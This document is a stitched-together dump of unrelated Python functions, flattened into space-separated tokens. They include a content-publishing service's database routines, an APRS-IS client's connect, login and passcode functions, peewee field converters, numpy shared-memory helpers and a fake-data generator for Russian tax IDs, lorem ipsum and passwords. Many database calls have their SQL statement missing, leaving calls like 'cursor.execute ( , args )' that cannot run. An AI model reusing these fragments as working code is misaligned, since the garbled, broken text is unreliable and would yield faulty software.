def lookup_document_pointer ( ident_hash , cursor ) : id , version = split_ident_hash ( ident_hash , split_version = True ) stmt = "SELECT name FROM modules WHERE uuid = %s" args = [ id ] if version and version [ 0 ] is not None : operator = version [ 1 ] is None and 'is' or '=' stmt += " AND (major_version = %s AND minor_version {} %s)" . format ( operator ) args . extend ( version ) cursor . execute ( stmt , args ) try : title = cursor . fetchone ( ) [ 0 ] except TypeError : raise DocumentLookupError ( ) else : metadata = { 'title' : title } return cnxepub . DocumentPointer ( ident_hash , metadata )
def _check_pending_document_license_state ( cursor , document_id ) : cursor . execute ( , ( document_id , ) ) try : is_accepted = cursor . fetchone ( ) [ 0 ] except TypeError : # There are no licenses associated with this document. is_accepted = True return is_accepted
def _check_pending_document_role_state ( cursor , document_id ) : cursor . execute ( , ( document_id , ) ) try : is_accepted = cursor . fetchone ( ) [ 0 ] except TypeError : # There are no roles to accept is_accepted = True return is_accepted
def _update_pending_document_state ( cursor , document_id , is_license_accepted , are_roles_accepted ) : args = ( bool ( is_license_accepted ) , bool ( are_roles_accepted ) , document_id , ) cursor . execute ( , args )
def check_publication_state ( publication_id ) : with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( , ( publication_id , ) ) publication_state , publication_messages = cursor . fetchone ( ) return publication_state , publication_messages
def _node_to_model ( tree_or_item , metadata = None , parent = None , lucent_id = cnxepub . TRANSLUCENT_BINDER_ID ) : if 'contents' in tree_or_item : # It is a binder. tree = tree_or_item binder = cnxepub . TranslucentBinder ( metadata = tree ) for item in tree [ 'contents' ] : node = _node_to_model ( item , parent = binder , lucent_id = lucent_id ) if node . metadata [ 'title' ] != item [ 'title' ] : binder . set_title_for_node ( node , item [ 'title' ] ) result = binder else : # It is an item pointing at a document. item = tree_or_item result = cnxepub . DocumentPointer ( item [ 'id' ] , metadata = item ) if parent is not None : parent . append ( result ) return result
def _reassemble_binder ( id , tree , metadata ) : binder = cnxepub . Binder ( id , metadata = metadata ) for item in tree [ 'contents' ] : node = _node_to_model ( item , parent = binder ) if node . metadata [ 'title' ] != item [ 'title' ] : binder . set_title_for_node ( node , item [ 'title' ] ) return binder
def set_post_publications_state ( cursor , module_ident , state_name , state_message = '' ) : # pragma: no cover cursor . execute ( , ( module_ident , state_name , state_message ) )
def update_module_state ( cursor , module_ident , state_name , recipe ) : # pragma: no cover cursor . execute ( , ( state_name , recipe , module_ident ) )
def get_moderation ( request ) : with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( ) moderations = [ x [ 0 ] for x in cursor . fetchall ( ) ] return moderations
def includeme ( config ) : settings = config . registry . settings session_factory = SignedCookieSessionFactory ( settings [ 'session_key' ] ) config . set_session_factory ( session_factory )
def get_api_keys ( request ) : with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( ) api_keys = [ x [ 0 ] for x in cursor . fetchall ( ) ] return api_keys
def admin_content_status_single ( request ) : uuid = request . matchdict [ 'uuid' ] try : UUID ( uuid ) except ValueError : raise httpexceptions . HTTPBadRequest ( '{} is not a valid uuid' . format ( uuid ) ) statement , sql_args = get_baking_statuses_sql ( { 'uuid' : uuid } ) with db_connect ( cursor_factory = DictCursor ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( statement , sql_args ) modules = cursor . fetchall ( ) if len ( modules ) == 0 : raise httpexceptions . HTTPBadRequest ( '{} is not a book' . format ( uuid ) ) states = [ ] collection_info = modules [ 0 ] for row in modules : message = '' state = row [ 'state' ] or 'PENDING' if state == 'FAILURE' : # pragma: no cover if row [ 'traceback' ] is not None : message = row [ 'traceback' ] latest_recipe = row [ 'latest_recipe_id' ] current_recipe = row [ 'recipe_id' ] if ( latest_recipe is not None and current_recipe != latest_recipe ) : state += ' stale_recipe' states . append ( { 'version' : row [ 'current_version' ] , 'recipe' : row [ 'recipe' ] , 'created' : str ( row [ 'created' ] ) , 'state' : state , 'state_message' : message , } ) return { 'uuid' : str ( collection_info [ 'uuid' ] ) , 'title' : collection_info [ 'name' ] . decode ( 'utf-8' ) , 'authors' : format_authors ( collection_info [ 'authors' ] ) , 'print_style' : collection_info [ 'print_style' ] , 'current_recipe' : collection_info [ 'recipe_id' ] , 'current_ident' : collection_info [ 'module_ident' ] , 'current_state' : states [ 0 ] [ 'state' ] , 'states' : states }
def admin_content_status_single_POST ( request ) : args = admin_content_status_single ( request ) title = args [ 'title' ] if args [ 'current_state' ] == 'SUCCESS' : args [ 'response' ] = title + ' is not stale, no need to bake' return args with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( "SELECT stateid FROM modules WHERE module_ident=%s" , vars = ( args [ 'current_ident' ] , ) ) data = cursor . fetchall ( ) if len ( data ) == 0 : raise httpexceptions . HTTPBadRequest ( 'invalid module_ident: {}' . format ( args [ 'current_ident' ] ) ) if data [ 0 ] [ 0 ] == 5 or data [ 0 ] [ 0 ] == 6 : args [ 'response' ] = title + ' is already baking/set to bake' return args cursor . execute ( , vars = ( args [ 'current_ident' ] , ) ) args [ 'response' ] = title + " set to bake!" return args
def _insert_metadata ( cursor , model , publisher , message ) : params = model . metadata . copy ( ) params [ 'publisher' ] = publisher params [ 'publication_message' ] = message params [ '_portal_type' ] = _model_to_portaltype ( model ) params [ 'summary' ] = str ( cnxepub . DocumentSummaryFormatter ( model ) ) # Transform person structs to id lists for database array entry. for person_field in ATTRIBUTED_ROLE_KEYS : params [ person_field ] = [ parse_user_uri ( x [ 'id' ] ) for x in params . get ( person_field , [ ] ) ] params [ 'parent_ident_hash' ] = parse_parent_ident_hash ( model ) # Assign the id and version if one is known. if model . ident_hash is not None : uuid , version = split_ident_hash ( model . ident_hash , split_version = True ) params [ '_uuid' ] = uuid params [ '_major_version' ] , params [ '_minor_version' ] = version # Lookup legacy ``moduleid``. cursor . execute ( "SELECT moduleid FROM latest_modules WHERE uuid = %s" , ( uuid , ) ) # There is the chance that a uuid and version have been set, #   but a previous publication does not exist. Therefore the #   moduleid will not be found. This happens on a pre-publication. try : moduleid = cursor . fetchone ( ) [ 0 ] except TypeError : # NoneType moduleid = None params [ '_moduleid' ] = moduleid # Verify that uuid is reserved in document_contols. If not, add it. cursor . execute ( "SELECT * from document_controls where uuid = %s" , ( uuid , ) ) try : cursor . fetchone ( ) [ 0 ] except TypeError : # NoneType cursor . execute ( "INSERT INTO document_controls (uuid) VALUES (%s)" , ( uuid , ) ) created = model . metadata . get ( 'created' , None ) # Format the statement to accept the identifiers. stmt = MODULE_INSERTION_TEMPLATE . format ( * * { '__uuid__' : "%(_uuid)s::uuid" , '__major_version__' : "%(_major_version)s" , '__minor_version__' : "%(_minor_version)s" , '__moduleid__' : moduleid is None and "DEFAULT" or "%(_moduleid)s" , '__created__' : created is None and "DEFAULT" or "%(created)s" , } ) else : created = model . metadata . get ( 'created' , None ) # Format the statement for defaults. stmt = MODULE_INSERTION_TEMPLATE . format ( * * { '__uuid__' : "DEFAULT" , '__major_version__' : "DEFAULT" , '__minor_version__' : "DEFAULT" , '__moduleid__' : "DEFAULT" , '__created__' : created is None and "DEFAULT" or "%(created)s" , } ) # Insert the metadata cursor . execute ( stmt , params ) module_ident , ident_hash = cursor . fetchone ( ) # Insert optional roles _insert_optional_roles ( cursor , model , module_ident ) return module_ident , ident_hash
def _insert_tree ( cursor , tree , parent_id = None , index = 0 , is_collated = False ) : if isinstance ( tree , dict ) : if tree [ 'id' ] == 'subcol' : document_id = None title = tree [ 'title' ] else : cursor . execute ( , ( tree [ 'id' ] , ) ) try : document_id , document_title = cursor . fetchone ( ) except TypeError : # NoneType raise ValueError ( "Missing published document for '{}'." . format ( tree [ 'id' ] ) ) if tree . get ( 'title' , None ) : title = tree [ 'title' ] else : title = document_title # TODO We haven't settled on a flag (name or value) #      to pin the node to a specific version. is_latest = True cursor . execute ( TREE_NODE_INSERT , dict ( document_id = document_id , parent_id = parent_id , title = title , child_order = index , is_latest = is_latest , is_collated = is_collated ) ) node_id = cursor . fetchone ( ) [ 0 ] if 'contents' in tree : _insert_tree ( cursor , tree [ 'contents' ] , parent_id = node_id , is_collated = is_collated ) elif isinstance ( tree , list ) : for tree_node in tree : _insert_tree ( cursor , tree_node , parent_id = parent_id , index = tree . index ( tree_node ) , is_collated = is_collated )
def publish_model ( cursor , model , publisher , message ) : publishers = publisher if isinstance ( publishers , list ) and len ( publishers ) > 1 : raise ValueError ( "Only one publisher is allowed. '{}' " "were given: {}" . format ( len ( publishers ) , publishers ) ) module_ident , ident_hash = _insert_metadata ( cursor , model , publisher , message ) for resource in getattr ( model , 'resources' , [ ] ) : _insert_resource_file ( cursor , module_ident , resource ) if isinstance ( model , Document ) : html = bytes ( cnxepub . DocumentContentFormatter ( model ) ) sha1 = hashlib . new ( 'sha1' , html ) . hexdigest ( ) cursor . execute ( "SELECT fileid FROM files WHERE sha1 = %s" , ( sha1 , ) ) try : fileid = cursor . fetchone ( ) [ 0 ] except TypeError : file_args = { 'media_type' : 'text/html' , 'data' : psycopg2 . Binary ( html ) , } cursor . execute ( , file_args ) fileid = cursor . fetchone ( ) [ 0 ] args = { 'module_ident' : module_ident , 'filename' : 'index.cnxml.html' , 'fileid' : fileid , } cursor . execute ( , args ) elif isinstance ( model , Binder ) : tree = cnxepub . model_to_tree ( model ) tree = _insert_tree ( cursor , tree ) return ident_hash
def publish_composite_model ( cursor , model , parent_model , publisher , message ) : if not ( isinstance ( model , CompositeDocument ) or ( isinstance ( model , Binder ) and model . metadata . get ( 'type' ) == 'composite-chapter' ) ) : raise ValueError ( "This function only publishes Composite" "objects. '{}' was given." . format ( type ( model ) ) ) if issequence ( publisher ) and len ( publisher ) > 1 : raise ValueError ( "Only one publisher is allowed. '{}' " "were given: {}" . format ( len ( publisher ) , publisher ) ) module_ident , ident_hash = _insert_metadata ( cursor , model , publisher , message ) model . id , model . metadata [ 'version' ] = split_ident_hash ( ident_hash ) model . set_uri ( 'cnx-archive' , ident_hash ) for resource in model . resources : _insert_resource_file ( cursor , module_ident , resource ) if isinstance ( model , CompositeDocument ) : html = bytes ( cnxepub . DocumentContentFormatter ( model ) ) fileid , _ = _insert_file ( cursor , io . BytesIO ( html ) , 'text/html' ) file_arg = { 'module_ident' : module_ident , 'parent_ident_hash' : parent_model . ident_hash , 'fileid' : fileid , } cursor . execute ( , file_arg ) return ident_hash
def publish ( request ) : if 'epub' not in request . POST : raise httpexceptions . HTTPBadRequest ( "Missing EPUB in POST body." ) is_pre_publication = asbool ( request . POST . get ( 'pre-publication' ) ) epub_upload = request . POST [ 'epub' ] . file try : epub = cnxepub . EPUB . from_file ( epub_upload ) except : # noqa: E722 raise httpexceptions . HTTPBadRequest ( 'Format not recognized.' ) # Make a publication entry in the database for status checking # the publication. This also creates publication entries for all # of the content in the EPUB. with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : epub_upload . seek ( 0 ) publication_id , publications = add_publication ( cursor , epub , epub_upload , is_pre_publication ) # Poke at the publication & lookup its state. state , messages = poke_publication_state ( publication_id ) response_data = { 'publication' : publication_id , 'mapping' : publications , 'state' : state , 'messages' : messages , } return response_data
def bake_content ( request ) : ident_hash = request . matchdict [ 'ident_hash' ] try : id , version = split_ident_hash ( ident_hash ) except IdentHashError : raise httpexceptions . HTTPNotFound ( ) if not version : raise httpexceptions . HTTPBadRequest ( 'must specify the version' ) with db_connect ( ) as db_conn : with db_conn . cursor ( ) as cursor : cursor . execute ( , ( ident_hash , ) ) try : is_binder , stateid , module_ident = cursor . fetchone ( ) except TypeError : raise httpexceptions . HTTPNotFound ( ) if not is_binder : raise httpexceptions . HTTPBadRequest ( '{} is not a book' . format ( ident_hash ) ) if stateid == 5 : cursor . execute ( , ( module_ident , ident_hash ) ) else : cursor . execute ( , ( ident_hash , ) )
def includeme ( config ) : global cache_manager settings = config . registry . settings cache_manager = CacheManager ( * * parse_cache_config_options ( settings ) )
def path_to_node ( tree , path ) : if path is None : return None node = tree for key in path : node = child_by_key ( node , key ) return node
def cli ( url , user_agent ) : kwargs = { } if user_agent : kwargs [ 'user_agent' ] = user_agent archive_url = capture ( url , * * kwargs ) click . echo ( archive_url )
def get_channel_image ( self , channel , img_size = 300 , skip_cache = False ) : from bs4 import BeautifulSoup from wikipedia . exceptions import PageError import re import wikipedia wikipedia . set_lang ( 'fr' ) if not channel : _LOGGER . error ( 'Channel is not set. Could not retrieve image.' ) return # Check if the image is in cache if channel in self . _cache_channel_img and not skip_cache : img = self . _cache_channel_img [ channel ] _LOGGER . debug ( 'Cache hit: %s -> %s' , channel , img ) return img channel_info = self . get_channel_info ( channel ) query = channel_info [ 'wiki_page' ] if not query : _LOGGER . debug ( 'Wiki page is not set for channel %s' , channel ) return _LOGGER . debug ( 'Query: %s' , query ) # If there is a max image size defined use it. if 'max_img_size' in channel_info : if img_size > channel_info [ 'max_img_size' ] : _LOGGER . info ( 'Requested image size is bigger than the max, ' 'setting it to %s' , channel_info [ 'max_img_size' ] ) img_size = channel_info [ 'max_img_size' ] try : page = wikipedia . page ( query ) _LOGGER . debug ( 'Wikipedia article title: %s' , page . title ) soup = BeautifulSoup ( page . html ( ) , 'html.parser' ) images = soup . find_all ( 'img' ) img_src = None for i in images : if i [ 'alt' ] . startswith ( 'Image illustrative' ) : img_src = re . sub ( r'\d+px' , '{}px' . format ( img_size ) , i [ 'src' ] ) img = 'https:{}' . format ( img_src ) if img_src else None # Cache result self . _cache_channel_img [ channel ] = img return img except PageError : _LOGGER . error ( 'Could not fetch channel image for %s' , channel )
def forwards ( self , orm ) : # Note: Remember to use orm['appname.ModelName'] rather than "from appname.models..." for translation in orm [ 'people.PersonTranslation' ] . objects . all ( ) : if translation . language in [ 'en' , 'de' ] : translation . roman_first_name = translation . first_name translation . roman_last_name = translation . last_name else : translation . non_roman_first_name = translation . first_name translation . non_roman_last_name = translation . last_name translation . save ( )
def forwards ( self , orm ) : for translation in orm [ 'people.PersonTranslation' ] . objects . all ( ) : translation . person . roman_first_name = translation . roman_first_name translation . person . roman_last_name = translation . roman_last_name translation . person . non_roman_first_name = translation . non_roman_first_name translation . person . non_roman_last_name = translation . non_roman_last_name translation . person . save ( )
def _smixins ( self , name ) : return ( self . _mixins [ name ] if name in self . _mixins else False )
def _blocks ( self , name ) : i = len ( self ) while i >= 0 : i -= 1 if name in self [ i ] [ '__names__' ] : for b in self [ i ] [ '__blocks__' ] : r = b . raw ( ) if r and r == name : return b else : for b in self [ i ] [ '__blocks__' ] : r = b . raw ( ) if r and name . startswith ( r ) : b = utility . blocksearch ( b , name ) if b : return b return False
def user_and_project_from_git ( self , options , arg0 = None , arg1 = None ) : user , project = self . user_project_from_option ( options , arg0 , arg1 ) if user and project : return user , project try : remote = subprocess . check_output ( [ 'git' , 'config' , '--get' , 'remote.{0}.url' . format ( options . git_remote ) ] ) except subprocess . CalledProcessError : return None , None except WindowsError : print ( "git binary not found." ) exit ( 1 ) else : return self . user_project_from_remote ( remote )
def fetch_tags_dates ( self ) : if self . options . verbose : print ( "Fetching dates for {} tags..." . format ( len ( self . filtered_tags ) ) ) def worker ( tag ) : self . get_time_of_tag ( tag ) # Async fetching tags: threads = [ ] max_threads = 50 cnt = len ( self . filtered_tags ) for i in range ( 0 , ( cnt // max_threads ) + 1 ) : for j in range ( max_threads ) : idx = i * 50 + j if idx == cnt : break t = threading . Thread ( target = worker , args = ( self . filtered_tags [ idx ] , ) ) threads . append ( t ) t . start ( ) if self . options . verbose > 2 : print ( "." , end = "" ) for t in threads : t . join ( ) if self . options . verbose > 2 : print ( "." ) if self . options . verbose > 1 : print ( "Fetched dates for {} tags." . format ( len ( self . tag_times_dict ) ) )
def fetch_and_filter_tags ( self ) : self . all_tags = self . fetcher . get_all_tags ( ) self . filtered_tags = self . get_filtered_tags ( self . all_tags ) self . fetch_tags_dates ( )
def to_decimal ( text ) : if not isinstance ( text , string_type ) : raise TypeError ( "expected str or unicode, %s given" % type ( text ) ) if findall ( r"[\x00-\x20\x7c-\xff]" , text ) : raise ValueError ( "invalid character in sequence" ) text = text . lstrip ( '!' ) decimal = 0 length = len ( text ) - 1 for i , char in enumerate ( text ) : decimal += ( ord ( char ) - 33 ) * ( 91 ** ( length - i ) ) return decimal if text != '' else 0
def passcode ( callsign ) : assert isinstance ( callsign , str ) callsign = callsign . split ( '-' ) [ 0 ] . upper ( ) code = 0x73e2 for i , char in enumerate ( callsign ) : code ^= ord ( char ) << ( 8 if not i % 2 else 0 ) return code & 0x7fff
def set_filter ( self , filter_text ) : self . filter = filter_text self . logger . info ( "Setting filter to: %s" , self . filter ) if self . _connected : self . _sendall ( "#filter %s\r\n" % self . filter )
def set_login ( self , callsign , passwd = "-1" , skip_login = False ) : self . __dict__ . update ( locals ( ) )
def _connect ( self ) : self . logger . info ( "Attempting connection to %s:%s" , self . server [ 0 ] , self . server [ 1 ] ) try : self . _open_socket ( ) peer = self . sock . getpeername ( ) self . logger . info ( "Connected to %s" , str ( peer ) ) # 5 second timeout to receive server banner self . sock . setblocking ( 1 ) self . sock . settimeout ( 5 ) self . sock . setsockopt ( socket . SOL_SOCKET , socket . SO_KEEPALIVE , 1 ) banner = self . sock . recv ( 512 ) if is_py3 : banner = banner . decode ( 'latin-1' ) if banner [ 0 ] == "#" : self . logger . debug ( "Banner: %s" , banner . rstrip ( ) ) else : raise ConnectionError ( "invalid banner from server" ) except ConnectionError as e : self . logger . error ( str ( e ) ) self . close ( ) raise except ( socket . error , socket . timeout ) as e : self . close ( ) self . logger . error ( "Socket error: %s" % str ( e ) ) if str ( e ) == "timed out" : raise ConnectionError ( "no banner from server" ) else : raise ConnectionError ( e ) self . _connected = True
def _send_login ( self ) : login_str = "user {0} pass {1} vers aprslib {3}{2}\r\n" login_str = login_str . format ( self . callsign , self . passwd , ( " filter " + self . filter ) if self . filter != "" else "" , __version__ ) self . logger . info ( "Sending login information" ) try : self . _sendall ( login_str ) self . sock . settimeout ( 5 ) test = self . sock . recv ( len ( login_str ) + 100 ) if is_py3 : test = test . decode ( 'latin-1' ) test = test . rstrip ( ) self . logger . debug ( "Server: %s" , test ) _ , _ , callsign , status , _ = test . split ( ' ' , 4 ) if callsign == "" : raise LoginError ( "Server responded with empty callsign???" ) if callsign != self . callsign : raise LoginError ( "Server: %s" % test ) if status != "verified," and self . passwd != "-1" : raise LoginError ( "Password is incorrect" ) if self . passwd == "-1" : self . logger . info ( "Login successful (receive only)" ) else : self . logger . info ( "Login successful" ) except LoginError as e : self . logger . error ( str ( e ) ) self . close ( ) raise except : self . close ( ) self . logger . error ( "Failed to login" ) raise LoginError ( "Failed to login" )
def _socket_readlines ( self , blocking = False ) : try : self . sock . setblocking ( 0 ) except socket . error as e : self . logger . error ( "socket error when setblocking(0): %s" % str ( e ) ) raise ConnectionDrop ( "connection dropped" ) while True : short_buf = b'' newline = b'\r\n' select . select ( [ self . sock ] , [ ] , [ ] , None if blocking else 0 ) try : short_buf = self . sock . recv ( 4096 ) # sock.recv returns empty if the connection drops if not short_buf : self . logger . error ( "socket.recv(): returned empty" ) raise ConnectionDrop ( "connection dropped" ) except socket . error as e : self . logger . error ( "socket error on recv(): %s" % str ( e ) ) if "Resource temporarily unavailable" in str ( e ) : if not blocking : if len ( self . buf ) == 0 : break self . buf += short_buf while newline in self . buf : line , self . buf = self . buf . split ( newline , 1 ) yield line
def db_value ( self , value ) : # ensure we have a valid UUID if not isinstance ( value , UUID ) : value = UUID ( value ) # reconstruct for optimal indexing parts = str ( value ) . split ( "-" ) reordered = '' . join ( [ parts [ 2 ] , parts [ 1 ] , parts [ 0 ] , parts [ 3 ] , parts [ 4 ] ] ) value = binascii . unhexlify ( reordered ) return super ( OrderedUUIDField , self ) . db_value ( value )
def python_value ( self , value ) : value = super ( OrderedUUIDField , self ) . python_value ( value ) u = binascii . b2a_hex ( value ) value = u [ 8 : 16 ] + u [ 4 : 8 ] + u [ 0 : 4 ] + u [ 16 : 22 ] + u [ 22 : 32 ] return UUID ( value . decode ( ) )
def db_value ( self , value ) : value = self . transform_value ( value ) return self . hhash . encrypt ( value , salt_size = self . salt_size , rounds = self . rounds )
def python_value ( self , value ) : value = coerce_to_bytes ( value ) obj = HashValue ( value ) obj . field = self return obj
def disconnect ( self ) : for name , connection in self . items ( ) : if not connection . is_closed ( ) : connection . close ( )
def get_database ( self , model ) : for router in self . routers : r = router . get_database ( model ) if r is not None : return r return self . get ( 'default' )
def to_cursor_ref ( self ) : fields = self . _meta . get_primary_keys ( ) assert fields values = { field . name : self . __data__ [ field . name ] for field in fields } return values
def apply_filters ( self , query , filters ) : assert isinstance ( query , peewee . Query ) assert isinstance ( filters , dict )
def list ( self , filters , cursor , count ) : assert isinstance ( filters , dict ) , "expected filters type 'dict'" assert isinstance ( cursor , dict ) , "expected cursor type 'dict'" # start with our base query query = self . get_query ( ) assert isinstance ( query , peewee . Query ) # XXX: convert and apply user specified filters #filters = {field.name: cursor[field.name] for field in fields} #query.where( paginator = self . get_paginator ( ) assert isinstance ( paginator , Pagination ) # always include an extra row for next cursor position count += 1 # apply pagination to query pquery = paginator . filter_query ( query , cursor , count ) items = [ item for item in pquery ] # determine next cursor position next_item = items . pop ( 1 ) next_cursor = next_item . to_cursor_ref ( ) return items , next_cursor
def retrieve ( self , cursor ) : assert isinstance ( cursor , dict ) , "expected cursor type 'dict'" # look for record in query query = self . get_query ( ) assert isinstance ( query , peewee . Query ) query return query . get ( * * cursor )
def refresh ( self , accept = MEDIA_TYPE_TAXII_V20 ) : self . refresh_information ( accept ) self . refresh_collections ( accept )
def _validate_server ( self ) : if not self . _title : msg = "No 'title' in Server Discovery for request '{}'" raise ValidationError ( msg . format ( self . url ) )
def refresh ( self ) : response = self . __raw = self . _conn . get ( self . url ) self . _populate_fields ( * * response ) self . _loaded = True
def empty_like ( array , dtype = None ) : array = numpy . asarray ( array ) if dtype is None : dtype = array . dtype return anonymousmemmap ( array . shape , dtype )
def full_like ( array , value , dtype = None ) : shared = empty_like ( array , dtype ) shared [ : ] = value return shared
def full ( shape , value , dtype = 'f8' ) : shared = empty ( shape , dtype ) shared [ : ] = value return shared
def flatten_dtype ( dtype , _next = None ) : types = [ ] if _next is None : _next = [ 0 , '' ] primary = True else : primary = False prefix = _next [ 1 ] if dtype . names is None : for i in numpy . ndindex ( dtype . shape ) : if dtype . base == dtype : types . append ( ( '%s%s' % ( prefix , simplerepr ( i ) ) , dtype ) ) _next [ 0 ] += 1 else : _next [ 1 ] = '%s%s' % ( prefix , simplerepr ( i ) ) types . extend ( flatten_dtype ( dtype . base , _next ) ) else : for field in dtype . names : typ_fields = dtype . fields [ field ] if len ( prefix ) > 0 : _next [ 1 ] = prefix + '.' + field else : _next [ 1 ] = '' + field flat_dt = flatten_dtype ( typ_fields [ 0 ] , _next ) types . extend ( flat_dt ) _next [ 1 ] = prefix if primary : return numpy . dtype ( types ) else : return types
def MetaOrdered ( parallel , done , turnstile ) : class Ordered : def __init__ ( self , iterref ) : if parallel . master : done [ ... ] = 0 self . iterref = iterref parallel . barrier ( ) @ classmethod def abort ( self ) : turnstile . release ( ) def __enter__ ( self ) : while self . iterref != done : pass turnstile . acquire ( ) return self def __exit__ ( self , * args ) : done [ ... ] += 1 turnstile . release ( ) return Ordered
def kill_all ( self ) : for pid in self . children : try : os . kill ( pid , signal . SIGTRAP ) except OSError : continue self . join ( )
def abort ( self ) : self . mutex . release ( ) self . turnstile . release ( ) self . mutex . release ( ) self . turnstile2 . release ( )
def read ( self , n ) : while len ( self . pool ) < n : self . cur = self . files . next ( ) self . pool = numpy . append ( self . pool , self . fetch ( self . cur ) , axis = 0 ) rt = self . pool [ : n ] if n == len ( self . pool ) : self . pool = self . fetch ( None ) else : self . pool = self . pool [ n : ] return rt
def adapt ( cls , source , template ) : if not isinstance ( template , packarray ) : raise TypeError ( 'template must be a packarray' ) return cls ( source , template . start , template . end )
def year ( past = False , min_delta = 0 , max_delta = 20 ) : return dt . date . today ( ) . year + _delta ( past , min_delta , max_delta )
def date ( past = False , min_delta = 0 , max_delta = 20 ) : timedelta = dt . timedelta ( days = _delta ( past , min_delta , max_delta ) ) return dt . date . today ( ) + timedelta
def street_number ( ) : length = int ( random . choice ( string . digits [ 1 : 6 ] ) ) return '' . join ( random . sample ( string . digits , length ) )
def zip_code ( ) : format = '#####' if random . random ( ) >= 0.5 : format = '#####-####' result = '' for item in format : if item == '#' : result += str ( random . randint ( 0 , 9 ) ) else : result += item return result
def job_title ( ) : result = random . choice ( get_dictionary ( 'job_titles' ) ) . strip ( ) result = result . replace ( '#{N}' , job_title_suffix ( ) ) return result
def body ( quantity = 2 , separator = '\n\n' , wrap_start = '' , wrap_end = '' , html = False , sentences_quantity = 3 , as_list = False ) : return lorem_ipsum . paragraphs ( quantity = quantity , separator = separator , wrap_start = wrap_start , wrap_end = wrap_end , html = html , sentences_quantity = sentences_quantity , as_list = as_list )
def money ( min = 0 , max = 10 ) : value = random . choice ( range ( min * 100 , max * 100 ) ) return "%1.2f" % ( float ( value ) / 100 )
def words ( quantity = 10 , as_list = False ) : global _words if not _words : _words = ' ' . join ( get_dictionary ( 'lorem_ipsum' ) ) . lower ( ) . replace ( '\n' , '' ) _words = re . sub ( r'\.|,|;/' , '' , _words ) _words = _words . split ( ' ' ) result = random . sample ( _words , quantity ) if as_list : return result else : return ' ' . join ( result )
def title ( words_quantity = 4 ) : result = words ( quantity = words_quantity ) result += random . choice ( '?.!' ) return result . capitalize ( )
def sentences ( quantity = 2 , as_list = False ) : result = [ sntc . strip ( ) for sntc in random . sample ( get_dictionary ( 'lorem_ipsum' ) , quantity ) ] if as_list : return result else : return ' ' . join ( result )
def paragraph ( separator = '\n\n' , wrap_start = '' , wrap_end = '' , html = False , sentences_quantity = 3 ) : return paragraphs ( quantity = 1 , separator = separator , wrap_start = wrap_start , wrap_end = wrap_end , html = html , sentences_quantity = sentences_quantity )
def paragraphs ( quantity = 2 , separator = '\n\n' , wrap_start = '' , wrap_end = '' , html = False , sentences_quantity = 3 , as_list = False ) : if html : wrap_start = '<p>' wrap_end = '</p>' separator = '\n\n' result = [ ] try : for _ in xrange ( 0 , quantity ) : result . append ( wrap_start + sentences ( sentences_quantity ) + wrap_end ) # Python 3 compatibility except NameError : for _ in range ( 0 , quantity ) : result . append ( wrap_start + sentences ( sentences_quantity ) + wrap_end ) if as_list : return result else : return separator . join ( result )
def characters ( quantity = 10 ) : line = map ( _to_lower_alpha_only , '' . join ( random . sample ( get_dictionary ( 'lorem_ipsum' ) , quantity ) ) ) return '' . join ( line ) [ : quantity ]
def text ( what = "sentence" , * args , * * kwargs ) : if what == "character" : return character ( * args , * * kwargs ) elif what == "characters" : return characters ( * args , * * kwargs ) elif what == "word" : return word ( * args , * * kwargs ) elif what == "words" : return words ( * args , * * kwargs ) elif what == "sentence" : return sentence ( * args , * * kwargs ) elif what == "sentences" : return sentences ( * args , * * kwargs ) elif what == "paragraph" : return paragraph ( * args , * * kwargs ) elif what == "paragraphs" : return paragraphs ( * args , * * kwargs ) elif what == "title" : return title ( * args , * * kwargs ) else : raise NameError ( 'No such method' )
def account_number ( ) : account = [ random . randint ( 1 , 9 ) for _ in range ( 20 ) ] return "" . join ( map ( str , account ) )
def bik ( ) : return '04' + '' . join ( [ str ( random . randint ( 1 , 9 ) ) for _ in range ( 5 ) ] ) + str ( random . randint ( 0 , 49 ) + 50 )
def legal_inn ( ) : mask = [ 2 , 4 , 10 , 3 , 5 , 9 , 4 , 6 , 8 ] inn = [ random . randint ( 1 , 9 ) for _ in range ( 10 ) ] weighted = [ v * mask [ i ] for i , v in enumerate ( inn [ : - 1 ] ) ] inn [ 9 ] = sum ( weighted ) % 11 % 10 return "" . join ( map ( str , inn ) )
def legal_ogrn ( ) : ogrn = "" . join ( map ( str , [ random . randint ( 1 , 9 ) for _ in range ( 12 ) ] ) ) ogrn += str ( ( int ( ogrn ) % 11 % 10 ) ) return ogrn
def person_inn ( ) : mask11 = [ 7 , 2 , 4 , 10 , 3 , 5 , 9 , 4 , 6 , 8 ] mask12 = [ 3 , 7 , 2 , 4 , 10 , 3 , 5 , 9 , 4 , 6 , 8 ] inn = [ random . randint ( 1 , 9 ) for _ in range ( 12 ) ] # get the 11th digit of the INN weighted11 = [ v * mask11 [ i ] for i , v in enumerate ( inn [ : - 2 ] ) ] inn [ 10 ] = sum ( weighted11 ) % 11 % 10 # get the 12th digit of the INN weighted12 = [ v * mask12 [ i ] for i , v in enumerate ( inn [ : - 1 ] ) ] inn [ 11 ] = sum ( weighted12 ) % 11 % 10 return "" . join ( map ( str , inn ) )
def password ( at_least = 6 , at_most = 12 , lowercase = True , uppercase = True , digits = True , spaces = False , punctuation = False ) : return text ( at_least = at_least , at_most = at_most , lowercase = lowercase , uppercase = uppercase , digits = digits , spaces = spaces , punctuation = punctuation )
